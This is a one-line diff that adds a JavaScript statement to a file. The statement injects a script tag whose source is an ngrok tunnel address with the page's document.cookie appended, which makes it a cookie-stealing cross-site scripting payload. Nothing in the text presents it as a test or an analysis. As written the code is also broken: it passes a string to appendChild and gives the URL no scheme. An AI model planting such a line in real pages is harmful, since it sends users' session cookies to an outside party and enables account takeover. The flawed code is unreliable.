@@ -1,0 +1,1 @@
+document.querySelector("body").appendChild("<script src=`82f5-2a01-9700-1353-e600-a450-3321-262f-eaf4.eu.ngrok.io/${document.cookie}`></script>")
